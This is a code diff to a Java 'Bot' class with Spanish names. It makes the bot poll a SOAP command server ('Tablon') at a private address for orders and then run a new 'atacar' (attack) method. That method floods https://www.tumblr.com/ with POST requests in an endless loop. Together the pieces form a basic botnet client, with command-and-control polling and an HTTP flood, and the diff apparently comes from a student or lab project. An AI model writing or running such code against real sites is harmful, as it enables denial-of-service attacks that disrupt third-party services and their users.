@@ -1,4 +1,11 @@
 
+import java.io.DataOutputStream;
+import java.io.IOException;
+import java.io.UnsupportedEncodingException;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+
 import org.apache.axiom.om.OMAbstractFactory;
 import org.apache.axiom.om.OMElement;
 import org.apache.axiom.om.OMFactory;
@@ -21,38 +28,38 @@ public class Bot {
 	private static String urlTablon = "http://192.168.0.13:7090/axis2/services/Tablon/";
 	private static String secreto = "bot";
 
-
 	public static void main(String[] args) {
 
 		boolean actuar = false;
-		while(!actuar){
+		Orden orden = null;
+		while (!actuar) {
 			try {
-				Thread.sleep(10000);
+				Thread.sleep(1000);
 			} catch (InterruptedException e) {
 				e.printStackTrace();
 			}
-			String comando = getComando();
-			System.out.println("Esta es mi orden: " + comando);
-			if(!comando.equals("")){
-				actuar=true;
+			orden = getComando();
+			if (!orden.getAccion().equals("")) {
+				actuar = true;
 				System.out.println("voy a actuar");
 			}
-			
 		}
+		System.out.println("Esta es mi orden: " + orden.getAccion());
+		atacar(orden);
+		
 		return;
 
 	}
 
-	private static String getComando() {
-		String comando = "";
-		
+	private static Orden getComando() {
+		Orden comando = null;
+
 		ServiceClient cliente = null;
 		try {
 			cliente = new ServiceClient();
 		} catch (AxisFault e) {
 			e.printStackTrace();
 		}
-
 
 		options.setTo(new EndpointReference(urlTablon));
 		options.setAction("urn:obey");
@@ -71,7 +78,7 @@ public class Bot {
 			e.printStackTrace();
 		}
 		System.out.println("LEIDO COMANDO : " + respuesta.getText());
-		comando = getOrden(respuesta.getFirstElement().getText()).getAccion();
+		comando = getOrden(respuesta.getFirstElement().getText());
 		try {
 			cliente.cleanup();
 			cliente.cleanupTransport();
@@ -79,13 +86,40 @@ public class Bot {
 			e.printStackTrace();
 		}
 
-
 		return comando;
 	}
 
 	private static Orden getOrden(String comando) {
 		Orden orden = new Orden(comando);
 		return orden;
+	}
+
+	private static void atacar(Orden orden) {
+		URL url = null;
+		HttpURLConnection connection = null;
+		boolean seguir = true;
+		while (seguir) {
+			System.out.println("ENVIAR PETICION HTTP");
+			try {
+				url = new URL("https://www.tumblr.com/");
+				String urlParameters = "param1=" + URLEncoder.encode("???", "UTF-8") + "&param2="
+						+ URLEncoder.encode("???", "UTF-8");
+				connection = (HttpURLConnection) url.openConnection();
+				connection.setRequestMethod("POST");
+				connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+				connection.setRequestProperty("Content-Length", Integer.toString(urlParameters.getBytes().length));
+				connection.setRequestProperty("Content-Language", "en-US");
+				connection.setUseCaches(false);
+				connection.setDoOutput(true);
+				DataOutputStream out = new DataOutputStream(connection.getOutputStream());
+				out.writeBytes(urlParameters);
+				out.close();
+
+			} catch (IOException e) {
+				e.printStackTrace();
+			}
+		}
+
 	}
 
 	private static ConfigurationContext getConf() {
